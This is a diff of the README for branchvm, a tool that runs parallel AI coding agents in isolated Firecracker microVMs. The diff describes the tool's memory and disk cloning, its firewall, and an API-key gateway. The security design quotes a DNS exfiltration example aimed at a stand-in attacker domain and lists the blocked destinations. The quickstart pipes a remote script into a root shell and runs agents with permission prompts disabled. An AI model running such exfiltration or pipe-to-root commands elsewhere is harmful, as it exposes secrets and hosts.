@@ -7,11 +7,12 @@
   <h1>branchvm</h1>
 
   <p>
-    Free local Firecracker sandboxes for running any number of AI coding agents in parallel on the same problem. Fork your repo and live backend services into isolated microVMs, test different implementations at once, and apply the winning diff back to your host.
+    Free local Firecracker sandboxes for running AI coding agents in parallel on any repo. Fork your app, dependencies, and backend databases into isolated microVMs, inspect each branch live, and apply the winning diff back to your host.
   </p>
 
   <p>
     <a href="#how-it-works">How it works</a> &middot;
+    <a href="#any-stack-with-branchvmtoml">Any stack</a> &middot;
     <a href="#under-the-hood">Under the hood</a> &middot;
     <a href="#quickstart">Quickstart</a> &middot;
     <a href="#security-verification">Verification</a> &middot;
@@ -23,15 +24,15 @@
 
 ## The problem
 
-When you hit a hard backend bug (a race condition, a broken migration, a tricky refactor), running one agent at a time is slow. You want to spin up multiple agents in parallel, let each one test a different approach against your real database and local services, and keep whichever patch passes the tests.
+When you hit a hard bug or a multi-file refactor, running one coding agent at a time is slow. You want to spin up multiple agents in parallel, let each one test a different approach against your real dependencies and database, inspect what each branch actually produced, and promote only the winner.
 
 Standard local tools break down here:
 
-- `git worktree` isolates files, while every worktree still hits the same local Postgres database on port `5432` and mutates the same tables. Any bad command also runs directly on your host.
-- Docker Compose cold boots Postgres from scratch for each copy, needs port remapping (`5433`, `5434`, `5435`), and shares one host Linux kernel across every container.
-- Hosted cloud sandboxes bill per second and require uploading your private repo and database state to someone else's servers.
+- `git worktree` isolates files, while every worktree still hits the same local Postgres port (`5432`) or dev server port (`3000`) and mutates the same state. Any bad command also runs directly on your host.
+- Docker Compose cold boots databases from scratch for each copy, needs port remapping (`5433`, `5434`, `5435`), and shares one host Linux kernel across every container.
+- Hosted cloud sandboxes bill per second and require uploading your private repo and database state to remote servers.
 
-`branchvm` solves this locally on your own hardware for $0/month. You boot one golden Firecracker microVM with your app and Postgres already running, save its RAM and CPU state once, and clone it into N isolated branches in ~200 ms. Your host repo stays untouched. Once the agents finish, you inspect the diffs, run `branchvm apply 2` to bring back the winning patch, and `branchvm` destroys every temporary VM, network, cgroup, and clone disk with a leak scan.
+`branchvm` solves this locally on your own hardware for $0/month. Point it at any `Dockerfile`, Docker image, or the built-in Go + Postgres rootfs, boot one golden Firecracker microVM once, save its RAM and disk state, and clone it into N isolated branches in ~200 ms. Your host repo stays untouched while branches run. Once agents finish, read branch output with `branchvm logs`, inspect changes with `branchvm diff`, drop into a live shell with `branchvm shell`, forward a branch web or DB port with `branchvm forward`, and run `branchvm apply <i>` to promote the winning patch with a leak scan.
 
 ## How it works
 
@@ -39,13 +40,51 @@ Standard local tools break down here:
   <img src="docs/diagrams/00-architecture-overview.png" width="860" alt="branchvm end-to-end architecture">
 </p>
 
-The workflow uses three commands:
+The workflow follows one loop:
 
-1. `branchvm init` cold boots one golden Firecracker microVM on an XFS pool, syncs your repo, runs an optional warm build command, checkpoints Postgres, scrubs `/etc/machine-id` and random seeds, pauses the VM, and writes `snapshot`, `vm.mem`, and `golden/rootfs.ext4`.
-2. `branchvm run --branches 3 -- <command>` restores N microVMs concurrently from that snapshot, syncs your current workspace into each branch, runs your agent or test script inside every branch, and collects each branch's `git diff`.
-3. `branchvm apply 2` checks and applies Branch 2's diff to your host repo, tears down all temporary VMs and networks, and verifies zero leaked host resources.
+1. `branchvm init` builds or selects your rootfs (`branchvm.toml` `dockerfile` / `image`, `--image`, or the base rootfs), boots one golden Firecracker microVM on an XFS pool, syncs your repo, runs an optional warm build command, checkpoints services, scrubs `/etc/machine-id` and random seeds, pauses the VM, and saves `snapshot`, `mem`, `golden/rootfs.ext4`, and `golden/meta.json`.
+2. `branchvm run --branches 3 -- <command>` restores N microVMs concurrently from that snapshot, uploads only changed files and deleted paths since `init`, runs your agent or test script inside every branch, and saves each branch's logs and `git diff`.
+3. Inspect and test live branches before promoting:
+   - `branchvm logs 2` prints Branch 2's saved stdout and stderr.
+   - `branchvm diff 2` (or `--stat`) prints Branch 2's live diff.
+   - `branchvm shell 2` opens an interactive PTY shell inside Branch 2 (with the LLM gateway attached).
+   - `branchvm forward 2 3000` forwards host `127.0.0.1:3000` to Branch 2's guest `127.0.0.1:3000` (or `5432:15432` for Postgres).
+4. `branchvm apply 2` checks and applies Branch 2's diff to your host repo, tears down all temporary VMs and networks, and verifies zero leaked host resources. `branchvm gc --all` discards any active runs on demand.
 
-`branchvm` is written in Go 1.23 with zero third-party dependencies in `go.mod`. Guest PID 1 (`cmd/execd`) compiles to a single static Linux binary and replaces `systemd` inside the microVM.
+`branchvm` is written in Go 1.23 with zero third-party dependencies in `go.mod`. Guest PID 1 (`cmd/execd`) compiles to a single static Linux binary, configures guest networking over `AF_NETLINK` with no `iproute2` dependency, and replaces `systemd` inside the microVM.
+
+## Any stack with `branchvm.toml`
+
+Add a short `branchvm.toml` at your repo root to run Node, Python, Rust, Go, Postgres, Redis, or stateless web apps:
+
+```toml
+dockerfile = "Dockerfile"        # or image = "node:22-slim"
+mem = 2048
+cpus = 2
+warm = "npm test -- --version"   # optional pre-snapshot cache warm
+services = ["postgres", "redis"] # omit or set [] for stateless apps
+database = "myapp"
+
+env = [
+  "DATABASE_URL=postgres://postgres@127.0.0.1:5432/myapp?sslmode=disable",
+]
+
+# Optional custom background service:
+# [[service]]
+# name = "worker"
+# cmd = ["node", "worker.js"]
+# ready_tcp = "127.0.0.1:4000"
+
+# Optional custom OpenAI/Anthropic-compatible API route:
+# [providers.together]
+# upstream = "https://api.together.xyz"
+# api_key_env = "TOGETHER_API_KEY"
+# auth_header = "Authorization"
+```
+
+When a repo has `branchvm.toml` and omits `services`, it defaults to stateless (zero background services, fast restore with no Postgres wait). When a repo has no `branchvm.toml`, `branchvm` keeps the v0.1 Go + Postgres default for full backwards compatibility.
+
+Every branch also injects headless coding-agent defaults (`IS_SANDBOX=1`, `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1`, dummy keys, and `ANTHROPIC_BASE_URL` / `OPENAI_BASE_URL` / `OPENROUTER_BASE_URL`), and seeds `/root/.claude.json` when building OCI images so commands like `claude --dangerously-skip-permissions -p "..."` and `codex exec "..."` run unattended through the host gateway.
 
 ## Under the hood
 
@@ -57,7 +96,7 @@ The workflow uses three commands:
 
 If 5 or 10 agents run concurrently, why do they not each consume a full 1 GiB of host RAM?
 
-The golden memory dump (`vm.mem`) is made of 262,144 pages of 4 KB each. While branches run at the same time, roughly 90% to 95% of what they read in RAM is identical: the Linux kernel, Postgres binaries, standard libraries, and unchanged tables. `branchvm` maps `vm.mem` with `MAP_PRIVATE` (or resolves faults through `userfaultfd`), so every branch reads those shared 4 KB pages from one physical copy in host RAM.
+The golden memory dump (`mem`) is made of 262,144 pages of 4 KB each. While branches run at the same time, roughly 90% to 95% of what they read in RAM is identical: the Linux kernel, database binaries, standard libraries, and unchanged memory. `branchvm` maps `mem` with `MAP_PRIVATE` (or resolves faults through `userfaultfd`), so every branch reads those shared 4 KB pages from one physical copy in host RAM.
 
 Only when a branch writes to a 4 KB page (an `INSERT` or a file edit) does the kernel trigger a Copy-on-Write fault and allocate a private 4 KB page for that branch. In our lab benchmarks on a 6 GiB host, 10 running 1 GiB clones used 620 MiB of host RAM total (62 MiB per clone) instead of 10,240 MiB.
 
@@ -67,7 +106,7 @@ Only when a branch writes to a 4 KB page (an `INSERT` or a file edit) does the k
   <img src="docs/diagrams/02-xfs-reflink-disk.png" width="860" alt="XFS reflink Copy-on-Write disk cloning">
 </p>
 
-Copying a 1.5 GB root disk image with normal `cp` reads and writes 1.5 GB on the SSD every time. `branchvm` creates a loopback XFS filesystem with `mkfs.xfs -m reflink=1,crc=1` and clones `golden/rootfs.ext4` using `cp --reflink=always`.
+Copying a multi-gigabyte root disk image with normal `cp` reads and writes the full disk on the SSD every time. `branchvm` creates a loopback XFS filesystem with `mkfs.xfs -m reflink=1,crc=1` and clones `golden/rootfs.ext4` using `cp --reflink=always`.
 
 A reflink clone finishes in ~1 ms and uses 0 extra bytes on disk. XFS writes a tiny metadata pointer table telling Branch 1's disk file to reference the same physical SSD blocks as the golden image. The moment an agent writes a file or commits a Postgres page, XFS allocates a new 4 KB block for that write alone and updates Branch 1's pointer. The golden disk stays immutable and concurrent clones never corrupt each other's `ext4` filesystem.
 
@@ -77,11 +116,9 @@ A reflink clone finishes in ~1 ms and uses 0 extra bytes on disk. XFS writes a t
   <img src="docs/diagrams/03-kernel-microvm-cgroup.png" width="860" alt="Docker shared kernel vs Firecracker microVM and cgroups v2">
 </p>
 
-The Linux kernel sits between physical hardware and user programs. Docker containers are host processes wrapped in namespaces, so every container sends syscalls directly to one shared host kernel. A kernel escape in one container reaches the host.
+Each `branchvm` branch runs inside a Firecracker microVM over Linux KVM (`/dev/kvm`) with its own guest Linux kernel behind a CPU hardware boundary, no BIOS, and no legacy PCI/USB emulation. On snapshot restore, Firecracker signals Linux `VMGenID` so each clone reseeds `/dev/urandom` right away instead of sharing identical random streams.
 
-Each `branchvm` branch runs inside a Firecracker microVM over Linux KVM (`/dev/kvm`). Every branch gets its own minimal guest Linux kernel behind a CPU hardware boundary, with no BIOS or legacy PCI/USB emulation. On snapshot restore, Firecracker signals Linux `VMGenID` so each clone reseeds `/dev/urandom` right away instead of sharing identical random streams.
-
-On the host, every Firecracker process sits inside its own `cgroups v2` directory (`/sys/fs/cgroup/branchvm/<run>-<i>`). That sets hard limits on `memory.max`, `cpu.max`, and `pids.max` so a memory leak or fork bomb inside one branch cannot crash the host, and `cgroup.kill` terminates every process atomically on teardown.
+On the host, every Firecracker process sits inside its own `cgroups v2` directory (`/sys/fs/cgroup/branchvm/<run>-<i>`), enforcing `memory.max`, `cpu.max`, and `pids.max` and tearing down processes atomically on cleanup.
 
 ### Network lockdown and the API gateway
 
@@ -89,15 +126,22 @@ On the host, every Firecracker process sits inside its own `cgroups v2` director
   <img src="docs/diagrams/04-firewall-gateway-lockdown.png" width="860" alt="nftables policy drop firewall and zero-MITM host gateway">
 </p>
 
-Every branch lives in its own Linux network namespace (`netns`), so every branch uses the same guest IP (`172.16.0.2`) and Postgres port (`127.0.0.1:5432`) with no port remapping.
+Every branch lives in its own Linux network namespace (`netns`), so every branch uses the same guest IP (`172.16.0.2`) and default ports (`5432`, `3000`, `6379`) with no port remapping.
 
 An `nftables` firewall inside each namespace sets `policy drop` by default. Outbound traffic to the public internet, private LAN ranges (`10/8`, `172.16/12`, `192.168/16`), host loopback, cloud metadata (`169.254.169.254`), IPv6, and raw DNS ports (`53` and `853`) are all dropped. Blocking raw DNS prevents an agent from smuggling secrets out inside a domain lookup like `nslookup secret.attacker.com`.
 
-To let the coding agent call an LLM API while the internet is blocked, the firewall opens one rule: traffic to `10.200.i.1:18080`, a per-branch Go reverse proxy on the host. Inside the guest, `branchvm` points `ANTHROPIC_BASE_URL` and `OPENAI_BASE_URL` at that gateway and injects a worthless dummy key (`bvm_dummy_i`). Your real API key never enters the VM. The host gateway verifies the dummy token in constant time, strips it, injects the real key from host memory, and opens a normal HTTPS connection to Anthropic or OpenAI. Because there is no fake TLS root certificate and no MITM proxy, static Go binaries and Python `certifi` work with no certificate errors.
+To let coding agents stream LLM responses while the internet is blocked, the firewall opens one rule: traffic to `10.200.i.1:18080`, a per-branch Go reverse proxy on the host with unbuffered SSE flushing (`FlushInterval: -1`). Inside the guest, `branchvm` injects a worthless dummy token (`bvm_dummy_i`). Your real API keys never enter the VM. The host gateway verifies the dummy token in constant time, strips it, injects the real host key (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `OPENROUTER_API_KEY`, or `[providers.*]`), and opens normal TLS connections upstream with zero fake root CAs.
 
 ## Quickstart
 
-On an Apple silicon Mac (M3 or newer, macOS 15 or newer), create the Lima lab VM first and shell into it:
+### Install on Linux (`amd64` or `arm64` with `/dev/kvm`)
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/Heman10x-NGU/branchvm/main/scripts/install.sh | sudo sh
+sudo bash /usr/local/share/branchvm/fetch-assets.sh
+```
+
+Or build from source (on Apple silicon M3+ Mac, create the Lima `fc-lab` VM first):
 
 ```bash
 scripts/setup-lima.sh
@@ -105,32 +149,58 @@ limactl shell fc-lab sudo bash scripts/fetch-assets.sh
 limactl shell fc-lab
 ```
 
-Inside the lab VM, from this repo (Lima mounts your home directory at the same path):
+Inside the Linux host or `fc-lab`:
 
 ```bash
-sudo scripts/build-rootfs.sh
-go build -o branchvm ./cmd/branchvm
-cd examples/auth-demo
-sudo -E ../../branchvm init --warm 'go test -run ^$ ./...'
-sudo -E ../../branchvm run --branches 3 -- ./demo-agents.sh
-sudo -E ../../branchvm apply 2
-git diff --stat
-sudo ../../branchvm verify --repo .
-cd ../..
-sudo ./branchvm bench
+make build-all
+sudo install -m 0755 bin/execd /var/lib/branchvm/assets/execd
 ```
 
-On a Linux host with KVM, skip the Lima steps and run `scripts/fetch-assets.sh` as root. `sudo -E` preserves `ANTHROPIC_API_KEY` and `OPENAI_API_KEY` for the host gateway; the offline demo script itself makes no network calls. Pass `--pager uffd` or `--pager fadvise` to `branchvm run` to switch away from plain `mmap` restores.
+### Example 1: Stateless Node app from `Dockerfile` (`examples/node-demo`)
+
+`examples/node-demo` uses `FROM node:22-slim` with no `iproute2` and no Postgres, proving `branchvm.toml` auto-build and stateless execution:
+
+```bash
+cd examples/node-demo
+sudo -E ../../bin/branchvm init
+sudo -E ../../bin/branchvm run --branches 3 -- node --test
+sudo ../../bin/branchvm logs 1
+sudo ../../bin/branchvm shell 1
+sudo ../../bin/branchvm gc --all
+```
+
+### Example 2: Full-stack Go + Postgres demo (`examples/auth-demo`)
+
+```bash
+sudo scripts/build-rootfs.sh   # optional: builds base Ubuntu + Go + Postgres rootfs
+cd examples/auth-demo
+sudo -E ../../bin/branchvm init --warm 'go test -run ^$ ./...'
+sudo -E ../../bin/branchvm run --branches 3 -- ./demo-agents.sh
+sudo ../../bin/branchvm diff 2 --stat
+sudo ../../bin/branchvm shell 2 -- go test ./...
+sudo -E ../../bin/branchvm apply 2
+git diff --stat
+sudo ../../bin/branchvm verify --repo .
+```
+
+### Example 3: Parallel Claude Code agents (`examples/agent-image`)
+
+```bash
+sudo docker build -t branchvm-agent:latest examples/agent-image
+cd examples/auth-demo
+sudo -E ../../bin/branchvm init --image branchvm-agent:latest
+sudo -E ../../bin/branchvm run --branches 3 -- claude --dangerously-skip-permissions -p "Fix the failing auth test and verify go test ./..."
+```
+
+Pass `--pager uffd` or `--pager fadvise` to `branchvm run` to switch away from plain `mmap` restores.
 
 ### Live demo page
 
-To run the same commands from a browser with streamed terminal logs and benchmark bars, start the local demo server inside `fc-lab` and open `http://localhost:8090` on your Mac (Lima forwards the port automatically):
+To run the core demo actions from a browser with streamed terminal logs and benchmark bars, start the local demo server inside `fc-lab` and open `http://localhost:8090` on your Mac (Lima forwards the port automatically):
 
 ```bash
 sudo -E python3 demo/server.py
 ```
-
-Measured in the lab: golden `init` takes 11.1 s cold without a warm command and about 7 min with a full `--warm` build. Per-branch snapshot restore took 246 to 421 ms with 3 branches restoring concurrently. In the auth demo, branch 1 fails 1 of 14 tests (13/14), branches 2 and 3 pass 14/14, and `apply 2` applies a 632 byte patch.
 
 ## Security verification
 
@@ -147,7 +217,7 @@ P6  zero-leak teardown  PASS    netns=0 veth=0 cgroups=0 clone_dirs=0 firecracke
 6/6 PASS
 ```
 
-P1 ran with host keys unset, so the substring scan for real keys inside the guest had nothing to search for. Set `ANTHROPIC_API_KEY` on the host before running `verify` to test the full substring leak scan too.
+Set `ANTHROPIC_API_KEY` on the host before running `verify` to test the full substring leak scan too.
 
 ## Benchmarks
 
@@ -159,7 +229,7 @@ Full methodology and all three tables are in [BENCHMARKS.md](BENCHMARKS.md). Eve
 
 | Tool | Isolation boundary | State cloning | Cost | Where it runs |
 |---|---|---|---|---|
-| branchvm | Firecracker microVM per branch, netns firewall, cgroup | Running guest memory and disk, Postgres included, from one snapshot | Free, your hardware | Local Linux with KVM |
+| branchvm | Firecracker microVM per branch, netns firewall, cgroup | Running guest memory and disk, DB/services included, from one snapshot | Free, your hardware | Local Linux with KVM |
 | boat.dev | Full Ubuntu VM per sandbox | Fork a sandbox with its disk; a DB counts only if it runs inside | Per-second billing, plans from $20 a month | Hosted |
 | Modal | gVisor sandbox | Sandbox snapshots; your existing DB stays outside | Per-second billing | Hosted |
 | E2B | Firecracker microVM per sandbox | Pause, resume, and fork with memory; a DB counts only if it runs inside | Per-second billing | Hosted |
@@ -167,13 +237,12 @@ Full methodology and all three tables are in [BENCHMARKS.md](BENCHMARKS.md). Eve
 | Microsandbox | libkrun microVM | New sandbox from an OCI image | Free, open source | Local |
 | E2B Embed | Firecracker microVM per sandbox | Same pause, resume, and fork as E2B Cloud | Free, Apache-2.0, your hardware | One self-hosted Linux machine with KVM |
 | Anthropic sandbox runtime (srt) | bubblewrap on Linux, sandbox-exec on macOS, proxy network filter | None; processes share the host filesystem and services | Free, open source | Local, no VM |
-| git worktree | None | Files only; every worktree shares one DB | Free | Local |
+| git worktree | None | Files only; every worktree shares one DB and port space | Free | Local |
 | vmsan | Firecracker microVM with jailer and netns | Per-VM snapshot and restore; a DB counts only if it runs inside | Free, open source | Local Linux with KVM |
 
 ## Limits
 
-- Requires Linux with KVM (`/dev/kvm`). Firecracker does not run natively on macOS; on a Mac you need the Lima lab VM with nested virtualization enabled.
-- The guest uses one fixed rootfs: Ubuntu 24.04 with Postgres 16, git, and Go, built by `scripts/build-rootfs.sh`. Adding Redis or another language runtime means editing that script.
-- The gateway forwards Anthropic and OpenAI API paths only. The netns firewall drops all other outbound packets, so commands that need package registries or other external APIs fail inside a branch.
+- Requires Linux with KVM (`/dev/kvm`). Firecracker does not run natively on macOS; on an M3 or newer Mac you need the Lima `fc-lab` VM with nested virtualization enabled.
+- The `nftables` firewall drops all outbound traffic except the host LLM gateway (`10.200.i.1:18080` for Anthropic, OpenAI, OpenRouter, and `[providers.*]`). Install project dependencies into your Dockerfile or `--warm` before `branchvm init`, since runtime `npm install` or `pip install` inside a branch cannot reach public registries.
 - Branch IPs are assigned per index, so one run owns the host at a time; `run` refuses to start while another run has live VMs.
 - This is a local developer tool, not multi-tenant production hardening. It runs as root, starts Firecracker without `jailer`, and does not isolate untrusted tenants from each other.
